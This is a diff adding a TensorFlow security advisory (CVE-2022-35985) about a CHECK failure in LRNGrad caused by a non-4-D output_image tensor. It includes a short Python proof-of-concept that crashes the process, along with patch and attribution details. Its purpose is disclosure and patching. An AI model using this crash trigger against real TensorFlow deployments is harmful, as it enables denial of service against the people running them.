@@ -1,0 +1,22 @@
+<h2>TFSA-2022-116: <code>CHECK</code> fail in <code>LRNGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35985</p>
+<h3>Impact</h3>
+<p>If <code>LRNGrad</code> is given an <code>output_image</code> input tensor that is not 4-D, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+depth_radius = 1
+bias = 1.59018219
+alpha = 0.117728651
+beta = 0.404427052
+input_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
+input_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
+output_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
+tf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255">bd90b3efab4ec958b228cd7cfe9125be1c0cf255</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
